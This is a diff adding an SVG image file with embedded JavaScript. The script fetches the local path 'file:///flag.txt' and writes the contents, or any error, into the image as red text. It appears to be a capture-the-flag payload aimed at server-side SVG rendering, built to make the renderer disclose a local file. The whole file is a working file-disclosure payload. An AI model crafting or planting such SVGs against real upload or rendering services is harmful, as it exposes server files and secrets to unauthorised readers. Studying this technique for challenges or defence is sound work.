@@ -1,0 +1,25 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script type="text/javascript">
+    fetch('file:///flag.txt')
+      .then(response => response.text())
+      .then(data => {
+        // Create a text element to display the flag
+        const text = document.createElementNS("http://www.w3.org/2000/svg", "text");
+        text.setAttribute("x", "10");
+        text.setAttribute("y", "50");
+        text.setAttribute("fill", "red");
+        text.textContent = data;
+        document.documentElement.appendChild(text);
+      })
+      .catch(error => {
+        // Create a text element to display any errors
+        const text = document.createElementNS("http://www.w3.org/2000/svg", "text");
+        text.setAttribute("x", "10");
+        text.setAttribute("y", "50");
+        text.setAttribute("fill", "red");
+        text.textContent = "Error: " + error;
+        document.documentElement.appendChild(text);
+      });
+  </script>
+  <rect width="100" height="100" fill="white"/>
+</svg> 
